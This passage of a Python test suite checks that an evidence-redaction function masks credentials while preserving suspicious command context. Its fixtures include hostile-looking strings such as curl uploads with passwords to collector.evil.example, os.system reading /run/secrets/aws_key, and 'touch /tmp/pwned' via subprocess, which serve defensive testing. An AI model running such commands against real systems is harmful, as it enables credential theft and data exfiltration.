            'config={"client_secret".ljust(0): "C001_KEYLJUST_SECRET_123456"}',
            "C001_KEYLJUST_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={"client_secret".expandtabs(): "C001_KEYEXPANDTABS_SECRET_123456"}',
            "C001_KEYEXPANDTABS_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={"client_secret".replace("", ""): "C001_KEYREPLACEEMPTY_SECRET_123456"}',
            "C001_KEYREPLACEEMPTY_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" or "public"): "C001_KEYBOOLOR_SECRET_123456"}',
            "C001_KEYBOOLOR_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" or "public".islower()): "C001_KEYBOOLSHORT_SECRET_123456"}',
            "C001_KEYBOOLSHORT_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if "yes" else "public"): "C001_KEYTRUTHYIF_SECRET_123456"}',
            "C001_KEYTRUTHYIF_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if 1 else "public"): "C001_KEYNUMIF_SECRET_123456"}',
            "C001_KEYNUMIF_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if ("yes",) else "public"): "C001_KEYTUPLEIF_SECRET_123456"}',
            "C001_KEYTUPLEIF_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if 1 == 1 else "public"): "C001_KEYCOMPAREIF_SECRET_123456"}',
            "C001_KEYCOMPAREIF_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if (1 == 1 and 2 == 2) else "public"): "C001_KEYANDCOMPARE_SECRET_123456"}',
            "C001_KEYANDCOMPARE_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if not (1 != 1) else "public"): "C001_KEYNOTCOMPARE_SECRET_123456"}',
            "C001_KEYNOTCOMPARE_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if "x" in "x" else "public"): "C001_KEYCONTAINS_SECRET_123456"}',
            "C001_KEYCONTAINS_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if "x" in "xy" == "xy" else "public"): "C001_KEYCHAIN_SECRET_123456"}',
            "C001_KEYCHAIN_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if "x" in ("x",) else "public"): "C001_KEYTUPMEM_SECRET_123456"}',
            "C001_KEYTUPMEM_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if "x" in ("x",) == ("x",) else "public"): "C001_KEYTUPCHAIN_SECRET_123456"}',
            "C001_KEYTUPCHAIN_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if "x" in ["x"] != ("x",) else "public"): "C001_KEYMIXSEQ_SECRET_123456"}',
            "C001_KEYMIXSEQ_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if "x" in {"x"} else "public"): "C001_KEYSETMEM_SECRET_123456"}',
            "C001_KEYSETMEM_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if ["x"] <= ["x"] else "public"): "C001_KEYLISTORDER_SECRET_123456"}',
            "C001_KEYLISTORDER_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if ("x",) <= ("x",) else "public"): "C001_KEYTUPORDER_SECRET_123456"}',
            "C001_KEYTUPORDER_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if {"x"} <= {"x"} else "public"): "C001_KEYSETSUBSET_SECRET_123456"}',
            "C001_KEYSETSUBSET_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'os.system("id"); (client_secret := "C001_WALRUS_SECRET_123456")',
            "C001_WALRUS_SECRET",
            f"client_secret := {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'os.system("id"); client_secret += "C001_AUGASSIGN_SECRET_123456"',
            "C001_AUGASSIGN_SECRET",
            f"client_secret += {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'os.system("id"); Authorization: Token C001_AUTHTOKEN_SECRET_123456',
            "C001_AUTHTOKEN_SECRET",
            f"Authorization: Token {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'os.system("id"); Authorization: Foo.Bar C001_DOTSCHEME_SECRET_123456',
            "C001_DOTSCHEME_SECRET",
            f"Authorization: Foo.Bar {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'os.system("id"); Authorization: Digest username=alice, response=C001_DIGEST_SECRET_123456',
            "C001_DIGEST_SECRET",
            f"Authorization: Digest {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={"Authorization": "Basic C001_JSONAUTH_SECRET_123456"}',
            "C001_JSONAUTH_SECRET",
            f"Authorization={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={str("Authorization"): "Basic C001_STRAUTH_SECRET_123456"}',
            "C001_STRAUTH_SECRET",
            f"Authorization={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={str("token"): "C001_STRTOKEN_SECRET_123456"}',
            "C001_STRTOKEN_SECRET",
            f"token={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={str("secret"): "C001_STRSECRET_SECRET_123456"}',
            "C001_STRSECRET_SECRET",
            f"secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'cfg["client_secret"] = "C001_SUBSCRIPT_SECRET_123456"',
            "C001_SUBSCRIPT_SECRET",
            f"client_secret = {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'cfg["client" + "_secret"] = "C001_SUBSCRIPTPLUS_SECRET_123456"',
            "C001_SUBSCRIPTPLUS_SECRET",
            f"client_secret = {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'cfg[("client_secret",)[0]] = "C001_SUBINDEX_SECRET_123456"',
            "C001_SUBINDEX_SECRET",
            f"client_secret = {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'cfg["client]secret".replace("]", "_")] = "C001_SUBBRACKET_SECRET_123456"',
            "C001_SUBBRACKET_SECRET",
            f"client_secret = {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'cfg["client_secret".encode().decode()] = "C001_ENCODEDECODE_SECRET_123456"',
            "C001_ENCODEDECODE_SECRET",
            f"client_secret = {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'headers["Authorization"] = "Basic C001_SUBAUTH_SECRET_123456"',
            "C001_SUBAUTH_SECRET",
            f"Authorization = {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if True is True else "public"): "C001_KEYIS_SECRET_123456"}',
            "C001_KEYIS_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if None is None else "public"): "C001_KEYNONEIS_SECRET_123456"}',
            "C001_KEYNONEIS_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if not None else "public"): "C001_KEYNOTNONE_SECRET_123456"}',
            "C001_KEYNOTNONE_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if not {} else "public"): "C001_KEYEMPTYDICT_SECRET_123456"}',
            "C001_KEYEMPTYDICT_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if not 0.0 else "public"): "C001_KEYFLOAT_SECRET_123456"}',
            "C001_KEYFLOAT_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if not b"" else "public"): "C001_KEYBYTES_SECRET_123456"}',
            "C001_KEYBYTES_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if not set() else "public"): "C001_KEYEMPTYSET_SECRET_123456"}',
            "C001_KEYEMPTYSET_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if not frozenset() else "public"): "C001_KEYEMPTYFROZEN_SECRET_123456"}',
            "C001_KEYEMPTYFROZEN_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if not set(()) else "public"): "C001_KEYSETTUPLE_SECRET_123456"}',
            "C001_KEYSETTUPLE_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if not list(()) else "public"): "C001_KEYLISTTUPLE_SECRET_123456"}',
            "C001_KEYLISTTUPLE_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if set(("x",)) else "public"): "RAWVALUE8"}',
            "RAWVALUE8",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if ("x",) in [("x",)] else "public"): "C001_KEYNESTMEM_SECRET_123456"}',
            "C001_KEYNESTMEM_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r'os.system("id"); client\u005fsecret="C001_ENCODEDKEY_SECRET_123456"',
            "C001_ENCODEDKEY_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if "x" not in ("y",) else "public"): "C001_KEYTUPNOTIN_SECRET_123456"}',
            "C001_KEYTUPNOTIN_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={{"x": "client_secret"}["x"]: "C001_KEYDICTLOOKUP_SECRET_123456"}',
            "C001_KEYDICTLOOKUP_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={{"x": "client_secret", "unused": True}["x"]: "C001_KEYDICTEXTRA_SECRET_123456"}',
            "C001_KEYDICTEXTRA_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={{"x": True, "x": "client_secret"}["x"]: "C001_KEYDUPLAST_SECRET_123456"}',
            "C001_KEYDUPLAST_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={{"x": "client" + "_secret", 1: True}["x"]: "C001_KEYDICTNONSTRKEY_SECRET_123456"}',
            "C001_KEYDICTNONSTRKEY_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={{"x": "client" + "_secret", **{}}["x"]: "C001_KEYDICTUNPACK_SECRET_123456"}',
            "C001_KEYDICTUNPACK_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={{("x".islower() and "x"): True, "x": "client_secret"}["x"]: "C001_KEYPREUNKNOWN_SECRET_123456"}',
            "C001_KEYPREUNKNOWN_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            (
                'config={{**{("x".islower() and "x"): True}, "x": "client_secret"}["x"]: '
                '"C001_KEYUNPACKUNKNOWN_SECRET_123456"}'
            ),
            "C001_KEYUNPACKUNKNOWN_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            (
                'config={{"x": "public", ("x".islower() and "x"): True, "x": "client_secret"}["x"]: '
                '"C001_KEYUNKNOWNMID_SECRET_123456"}'
            ),
            "C001_KEYUNKNOWNMID_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if True else "public"): "C001_KEYTERNARY_SECRET_123456"}',
            "C001_KEYTERNARY_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={"client_secret_x".split("_x")[0]: "C001_KEYSPLIT_SECRET_123456"}',
            "C001_KEYSPLIT_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
    ]

    for text, secret, expected in cases:
        redacted = redact_evidence_string(text, max_chars=500)
        assert secret not in redacted
        assert expected in redacted


def test_redacts_compound_sensitive_query_parameters() -> None:
    """Compound query credential keys should be redacted in URL evidence."""
    text = "url=https://example.com/callback?client_secret=CLIENTSECRET123&refresh_token=REFRESHTOKEN456&ok=1"

    redacted = redact_evidence_string(text, max_chars=500)

    assert "CLIENTSECRET123" not in redacted
    assert "REFRESHTOKEN456" not in redacted
    assert "client_secret=<redacted>" in redacted
    assert "refresh_token=<redacted>" in redacted
    assert "ok=1" in redacted


def test_redacts_malformed_userinfo_url() -> None:
    """Malformed userinfo URLs should fail closed instead of returning raw evidence."""
    text = "download=https://user:LEAKY-PASS@[::1/path?token=QUERYSECRET"

    redacted = redact_evidence_string(text, max_chars=500)

    assert "user:LEAKY-PASS" not in redacted
    assert "QUERYSECRET" not in redacted
    assert "https://<credentials-redacted>@[::1/path" in redacted


def test_existing_token_assignment_redaction_still_applies() -> None:
    """Canonical token assignments should keep their existing redaction behavior."""
    redacted = redact_evidence_string("token=CANONICALTOKEN123", max_chars=500)

    assert "CANONICALTOKEN123" not in redacted
    assert redacted == f"token={REDACTED_EVIDENCE_VALUE}"


def test_key_expression_format_evaluation_is_non_executing() -> None:
    """Unsafe format fields should not abort evidence redaction."""
    text = 'config={"{0.foo}".format("x"): "value"}; os.system("id")'

    redacted = redact_evidence_string(text, max_chars=500)

    assert "os.system" in redacted
    assert "value" in redacted


def test_key_expression_percent_evaluation_is_bounded() -> None:
    """Old-style percent formatting should reject width specifiers without expanding them."""
    text = 'config={"client%5000000s" % "_secret": "value"}; os.system("id")'

    redacted = redact_evidence_string(text, max_chars=500)

    assert len(redacted) < 500


def test_key_expression_format_evaluation_is_bounded() -> None:
    """Nested format expansion should not allocate large intermediate keys."""
    text = 'config={"{0}{0}{0}{0}{0}{0}{0}{0}{0}{0}".format("_secret"): "value"}; os.system("id")'

    redacted = redact_evidence_string(text, max_chars=500)

    assert len(redacted) < 500
    assert "os.system" in redacted


def test_redacted_mapping_value_preserves_following_command_evidence() -> None:
    """Secret values should be removed without hiding the suspicious command context."""
    text = 'config={"clientXsecret".replace("X", "_"): "C001_BOUNDARY_SECRET_123456"}; os.system("id")'

    redacted = redact_evidence_string(text, max_chars=500)

    assert "C001_BOUNDARY_SECRET" not in redacted
    assert f"client_secret={REDACTED_EVIDENCE_VALUE}" in redacted
    assert 'os.system("id")' in redacted


def test_non_sensitive_computed_key_preserves_command_value() -> None:
    """Fallback key inference should not override a safe non-sensitive evaluation."""
    text = (
        'config={"client".replace("secret", "x"): "os.system(1) C001_VISIBLE_COMMAND_123456"} '
        'config={"client".removesuffix("secret"): "os.system(2) C001_VISIBLE_REMOVESUFFIX_123456"} '
        'config={"client_secret".split("_secret")[0]: "os.system(3) C001_VISIBLE_SPLIT_123456"} '
        'config={"public" + "token": "os.system(5) C001_VISIBLE_PUBLICTOKEN_123456"} '
        'config={"client_secret".islower(): "os.system(6) C001_VISIBLE_ISLOWER_123456"} '
        'config={("public" or "client_secret"): "os.system(7) C001_VISIBLE_PUBLICOR_123456"} '
        'config={("public" if "yes" else "client_secret"): "os.system(8) C001_VISIBLE_TRUTHYIF_123456"} '
        'config={{"x": "public", "y": "client_secret"}["x"]: "os.system(9) C001_VISIBLE_DICTLOOKUP_123456"} '
        'config={("public" if 1 == 1 else "client_secret"): "os.system(10) C001_VISIBLE_COMPAREIF_123456"} '
        'config={{"x": "client_secret", ("x".islower() and "x"): True}["x"]: '
        '"os.system(12) C001_VISIBLE_SKIPPEDKEY_123456"} '
        'config={("client_secret" if "x" in "xy" == "x" else "public"): "os.system(13) C001_VISIBLE_CHAIN_123456"} '
        'config={("client_secret" if "x" in ["x"] == ("x",) else "public"): '
        '"os.system(14) C001_VISIBLE_MIXSEQ_123456"} '
        'config={"client_secret" == "public": "os.system(15) C001_VISIBLE_COMPARE_123456"}'
    )

    redacted = redact_evidence_string(text, max_chars=2000)

    assert f"client_secret={REDACTED_EVIDENCE_VALUE}" not in redacted
    assert f"client_secret = {REDACTED_EVIDENCE_VALUE}" not in redacted
    assert "C001_VISIBLE_COMMAND" in redacted
    assert "C001_VISIBLE_REMOVESUFFIX" in redacted
    assert "C001_VISIBLE_SPLIT" in redacted
    assert "C001_VISIBLE_PUBLICTOKEN" in redacted
    assert "C001_VISIBLE_ISLOWER" in redacted
    assert "C001_VISIBLE_PUBLICOR" in redacted
    assert "C001_VISIBLE_TRUTHYIF" in redacted
    assert "C001_VISIBLE_DICTLOOKUP" in redacted
    assert "C001_VISIBLE_COMPAREIF" in redacted
    assert "C001_VISIBLE_SKIPPEDKEY" in redacted
    assert "C001_VISIBLE_CHAIN" in redacted
    assert "C001_VISIBLE_MIXSEQ" in redacted
    assert "C001_VISIBLE_COMPARE" in redacted
    assert "os.system(1)" in redacted
    assert "os.system(2)" in redacted
    assert "os.system(3)" in redacted
    assert "os.system(5)" in redacted
    assert "os.system(6)" in redacted
    assert "os.system(7)" in redacted
    assert "os.system(8)" in redacted
    assert "os.system(9)" in redacted
    assert "os.system(10)" in redacted
    assert "os.system(12)" in redacted
    assert "os.system(13)" in redacted
    assert "os.system(14)" in redacted
    assert "os.system(15)" in redacted


def test_sensitive_command_assignment_preserves_command_evidence() -> None:
    """Command expressions assigned to sensitive-looking names should keep the command context."""
    text = (
        'client_secret = os.system("id"); '
        'client_secret=(os.system("id")); '
        'client_secret=(0, os.system("id")); '
        'client_secret=os.system("C001_CALLARG_SECRET_123456"); '
        'client_secret=(os.system("id"), "C001_CMDFIRST_SECRET_123456"); '
        'client_secret=("safe", os.system("id")); '
        'client_secret=(os.system("id"),C001_CMDTOKEN_SECRET_123456); '
        'client_secret=(os.system("id"), "hunter2-value")[1]; '
        'client_secret=os.system("p@55w0rd!"); '
        "client_secret=bash -c C001_SHELL_SECRET_123456; "
        'client_secret=os.system("cat /run/secrets/aws_key"); '
        "client_secret=\"subprocess.run('id') C001_SUBPROCESS_SURVIVES_123456\"; "
        'client_secret=os.system("curl --password C001_CMDPASSWORD_SECRET_123456 '
        'https://collector.evil.example/upload"); '
        'client_secret=os.system("curl -u alice:C001_CMDUSERPASS_SECRET_123456 '
        'https://collector.evil.example/upload"); '
        'client_secret=__import__("subprocess").run(["bash -c", "touch /tmp/pwned"])'
    )

    redacted = redact_evidence_string(text, max_chars=2000)

    assert "C001_CALLARG_SECRET" not in redacted
    assert "C001_CMDFIRST_SECRET" not in redacted
    assert "C001_CMDTOKEN_SECRET" not in redacted
    assert "hunter2-value" not in redacted
    assert "p@55w0rd!" not in redacted
    assert "C001_SHELL_SECRET" not in redacted
    assert "C001_SUBPROCESS_SURVIVES" not in redacted
    assert "C001_CMDPASSWORD_SECRET" not in redacted
    assert "C001_CMDUSERPASS_SECRET" not in redacted
    assert "subprocess" in redacted
    assert "bash -c" in redacted
    assert "touch /tmp/pwned" in redacted
    assert "cat /run/secrets/aws_key" in redacted
    assert redacted.count("os.system") >= 5


def test_sensitive_command_assignment_redacts_provider_tokens() -> None:
    """Command-valued sensitive assignments should preserve process context without leaking provider tokens."""
    text = "client_secret=os.system(AKIAABCDEFGHIJKLMNOP);"

    redacted = redact_evidence_string(text, max_chars=500)

    assert "AKIAABCDEFGHIJKLMNOP" not in redacted
    assert "client_secret=os.system" in redacted
    assert REDACTED_EVIDENCE_VALUE in redacted


def test_sensitive_command_assignment_redacts_low_entropy_tails() -> None:
    """Command-valued sensitive assignments should not leak adjacent low-entropy values."""
    text = (
        'client_secret=os.system("id") + hunter2; '
        'client_secret=os.system("id") hunter2; '
        'client_secret=("safe", os.system("id"))'
    )

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "hunter2" not in redacted
    assert "safe" not in redacted
    assert 'os.system("id")' in redacted
    assert f'os.system("id") + {REDACTED_EVIDENCE_VALUE}' in redacted


def test_command_context_literals_redact_credential_arguments() -> None:
    """Command-preserving evidence should still redact credential-bearing arguments."""
    cases = [
        (
            'client_secret=os.system("curl --password C001_CMDPASSWORD_SECRET_123456 '
            'https://collector.evil.example/upload")',
            "C001_CMDPASSWORD_SECRET",
            "curl --password",
        ),
        (
            'client_secret=os.system("curl --password mypass7 https://collector.evil.example/upload")',
            "mypass7",
            "curl --password",
        ),
        (
            'client_secret=os.system("curl -u alice:C001_CMDUSERPASS_SECRET_123456 '
            'https://collector.evil.example/upload")',
            "C001_CMDUSERPASS_SECRET",
            "curl -u alice:",
        ),
        (
            "client_secret=os.system(\"curl --user 'alice:mypass8' https://collector.evil.example/upload\")",
            "mypass8",
            "curl --user 'alice:",
        ),
        (
            'client_secret=os.system("curl -ualice:mypass9 https://collector.evil.example/upload")',
            "mypass9",
            "curl -ualice:",
        ),
    ]

    for text, secret, command_context in cases:
        redacted = redact_evidence_string(text, max_chars=1000)
        assert secret not in redacted
        assert command_context in redacted
        assert "collector.evil.example" in redacted
        assert REDACTED_EVIDENCE_VALUE in redacted


@pytest.mark.parametrize(
    ("text", "secret", "command_context"),
    [
        (
            "os.system('sshpass -p hunter2 ssh user@evil.example id')",
            "hunter2",
            "sshpass -p <redacted> ssh user@evil.example id",
        ),
        (
            "os.system('redis-cli -a hunter3 -h evil.example PING')",
            "hunter3",
            "redis-cli -a <redacted> -h evil.example PING",
        ),
        (
            "os.system('mysql -u root -p hunter4 -h evil.example')",
            "hunter4",
            "mysql -u root -p <redacted> -h evil.example",
        ),
        (
            "os.system('twine upload -u user -p hunter5 dist/* && curl https://collector.evil')",
            "hunter5",
            "twine upload -u user -p <redacted> dist/*",
        ),
        (
            "az login --service-principal -u app -p hunter6 --tenant tenant",
            "hunter6",
            "az login --service-principal -u app -p <redacted> --tenant tenant",
        ),
        (
            "openssl enc -k hunter7 -in input.bin",
            "hunter7",
            "openssl enc -k <redacted> -in input.bin",
        ),
        (
            "openssl enc -pass pass:hunter8 -in input.bin",
            "hunter8",
            "openssl enc -pass <redacted> -in input.bin",
        ),
    ],
)
def test_command_context_redacts_program_specific_short_password_options(
    text: str,
    secret: str,
    command_context: str,
) -> None:
    redacted = redact_evidence_string(text, max_chars=500)

    assert secret not in redacted
    assert command_context in redacted


@pytest.mark.parametrize(
    "text",
    [
        "os.system('curl -p 8080 https://evil.example/path')",
        "os.system('redis-cli -p 6379 -h evil.example PING')",
        "os.system('ssh -p 22 user@evil.example id')",
        "os.system('redis-cli --askpass -h evil.example PING')",
        "os.system('mysql -P3306 -h evil.example')",
        "os.system('mysql -p -h evil.example')",
        "os.system('twine upload -P public dist/* && curl https://collector.evil')",
        "az account show -p public-profile",
        "openssl enc -iv deadbeef -in input.bin",
    ],
)
def test_program_specific_short_password_near_matches_are_preserved(text: str) -> None:
    assert redact_evidence_string(text, max_chars=500) == text


@pytest.mark.parametrize(
    ("text", "secret", "command_context"),
    [
        (
            "curl --user :password7 https://collector.evil.example/upload",
            "password7",
            "curl --user :",
        ),
        (
            "curl --proxy-user=:proxy8 https://collector.evil.example/upload",
            "proxy8",
            "curl --proxy-user=:",
        ),
        (
            "curl -u:password9 https://collector.evil.example/upload",
            "password9",
            "curl -u:",
        ),
    ],
)
def test_command_context_redacts_passwords_with_empty_usernames(
    text: str,
    secret: str,
    command_context: str,
) -> None:
    redacted = redact_evidence_string(text, max_chars=1000)

    assert secret not in redacted
    assert command_context in redacted
    assert "collector.evil.example" in redacted
    assert REDACTED_EVIDENCE_VALUE in redacted


def test_empty_command_username_without_password_is_preserved() -> None:
    text = "curl --user : https://collector.evil.example/upload"

    assert redact_evidence_string(text, max_chars=1000) == text


@pytest.mark.parametrize(
    ("option", "password"),
    [
        ("user", "hunter2"),
        ("user", "hunter two"),
        ("user", "hunter;two"),
        ("user", "hunter&two"),
        ("proxy-user", "hunter2"),
    ],
)
def test_inline_curl_config_user_password_is_redacted(option: str, password: str) -> None:
    text = f"curl --config <(echo '{option} = alice:{password}') https://collector.evil.example/upload"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert password not in redacted
    assert f"{option} = alice:{REDACTED_EVIDENCE_VALUE}" in redacted
    assert "collector.evil.example" in redacted


@pytest.mark.parametrize("option", ["username", "user-agent", "proxy-user-file"])
def test_inline_curl_config_user_near_matches_are_preserved(option: str) -> None:
    text = f"curl --config <(echo '{option} = public:value') https://collector.evil.example/upload"

    assert redact_evidence_string(text, max_chars=1000) == text


@pytest.mark.parametrize("option", ["oauth2-bearer", "ftp-account"])
@pytest.mark.parametrize("separator", [" = ", ": "])
def test_inline_curl_config_credential_options_are_redacted(option: str, separator: str) -> None:
    text = f"curl --config <(echo '{option}{separator}hunter2') https://collector.evil.example/upload"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "hunter2" not in redacted
    assert option in redacted
    assert REDACTED_EVIDENCE_VALUE in redacted
    assert "collector.evil.example" in redacted


@pytest.mark.parametrize("option", ["oauth2-bearer-file", "ftp-account-file"])
def test_inline_curl_config_credential_option_near_matches_are_preserved(option: str) -> None:
    text = f"curl --config <(echo '{option} = public.txt') https://collector.evil.example/upload"

    assert redact_evidence_string(text, max_chars=1000) == text


@pytest.mark.parametrize(
    "text",
    [
        "printf 'oauth2-bearer = hunter2' | curl --config - https://collector.evil.example/upload",
        "curl --config - <<< 'ftp-account: hunter2' https://collector.evil.example/upload",
    ],
)
def test_inline_curl_stdin_config_credential_options_are_redacted(text: str) -> None:
    redacted = redact_evidence_string(text, max_chars=1000)

    assert "hunter2" not in redacted
    assert REDACTED_EVIDENCE_VALUE in redacted
    assert "collector.evil.example" in redacted


@pytest.mark.parametrize(
    "text",
    [
        "printf 'user = alice:hunter2' | curl --config - https://collector.evil.example/upload",
        "printf '--user = alice:hunter2' | curl --config - https://collector.evil.example/upload",
        "curl --config - <<< 'user = alice:hunter2' https://collector.evil.example/upload",
    ],
)
def test_inline_curl_stdin_config_password_is_redacted(text: str) -> None:
    redacted = redact_evidence_string(text, max_chars=1000)

    assert "hunter2" not in redacted
    assert f"user = alice:{REDACTED_EVIDENCE_VALUE}" in redacted
    assert "collector.evil.example" in redacted


@pytest.mark.parametrize(
    ("text", "secret", "expected"),
    [
        (
            "printf 'cert = client.pem:hunter2' | curl -K- https://collector.evil/upload",
            "hunter2",
            f"cert = client.pem:{REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"printf 'proxy-cert: client\:public.pem:hunter3' | curl --config - https://collector.evil/upload",
            "hunter3",
            rf"proxy-cert: client\:public.pem:{REDACTED_EVIDENCE_VALUE}",
        ),
        (
            "curl.exe --config - <<< 'cert = client.pem:hunter4' https://collector.evil/upload",
            "hunter4",
            f"cert = client.pem:{REDACTED_EVIDENCE_VALUE}",
        ),
        (
            "printf '--cert = client.pem:hunter4b' | curl --config - https://collector.evil/upload",
            "hunter4b",
            f"--cert = client.pem:{REDACTED_EVIDENCE_VALUE}",
        ),
        (
            "cat <<EOF | curl -K - https://collector.evil/upload\ncert = client.pem:hunter5\nEOF",
            "hunter5",
            f"cert = client.pem:{REDACTED_EVIDENCE_VALUE}",
        ),
    ],
)
def test_inline_curl_config_certificate_passwords_are_redacted(text: str, secret: str, expected: str) -> None:
    redacted = redact_evidence_string(text, max_chars=1000)

    assert secret not in redacted
    assert expected in redacted
    assert "collector.evil" in redacted


@pytest.mark.parametrize(
    "text",
    [
        "echo user=alice:public || curl -K -",
        r"curl -K- <<< 'cert = client\:public.pem'; echo user=public:visible",
    ],
)
def test_inline_curl_config_near_matches_do_not_redact_unrelated_text(text: str) -> None:
    assert redact_evidence_string(text, max_chars=1000) == text


@pytest.mark.parametrize(
    ("text", "secret"),
    [
        (
            "subprocess.run(['curl', '-K', '-'], input='cert = client.pem:hunter6', text=True)",
            "hunter6",
        ),
        (
            "subprocess.run(['curl.exe', '--config', '-'], input='proxy-cert: proxy.pem:hunter7')",
            "hunter7",
        ),
        (
            "subprocess.run(['/usr/bin/curl', '-K-'], input='oauth2-bearer = hunter8')",
            "hunter8",
        ),
        (
            "subprocess.run('curl -K -', input='user = alice:hunter9', shell=True)",
            "hunter9",
        ),
        (
            "subprocess.run('sudo -u root curl -K -', input='user = alice:hunter10', shell=True)",
            "hunter10",
        ),
        (
            "subprocess.run(['curl', '-sK-'], input='user = alice:hunter11')",
            "hunter11",
        ),
        (
            "subprocess.run(['curl', '-sK', '-'], input='user = alice:' + 'hunter12')",
            "hunter12",
        ),
        (
            "subprocess.run(['curl', '-K', '-'], input='user=alice:hunter13\\n" + ("x" * 4_090) + "')",
            "hunter13",
        ),
        (
            "subprocess.run('curl https://example.com; curl -K -', input='user=alice:hunter14', shell=True)",
            "hunter14",
        ),
        (
            "subprocess.run(['curl', '--config', '/dev/stdin'], input='user=alice:hunter15')",
            "hunter15",
        ),
        (
            "subprocess.run(['curl', '--config=/dev/fd/0'], input='user=alice:hunter16')",
            "hunter16",
        ),
        (
            "subprocess.run(['curl', '-K/proc/self/fd/0'], input='user=alice:hunter17')",
            "hunter17",
        ),
        (
            "subprocess.run(['curl', '--netrc-file', '/dev/stdin'], "
            "input='machine collector.evil login alice password hunter18')",
            "hunter18",
        ),
    ],
)
def test_subprocess_curl_stdin_config_passwords_are_redacted(text: str, secret: str) -> None:
    redacted = redact_evidence_string(text, max_chars=1000)

    assert secret not in redacted
    assert REDACTED_EVIDENCE_VALUE in redacted


@pytest.mark.parametrize(
    "text",
    [
        "subprocess.run(['curl', '-k', '-'], input='user = alice:public')",
        "subprocess.run(['curl', '-k-'], input='user = alice:public')",
        "subprocess.run(['curl', '-K=-'], input='user = alice:public')",
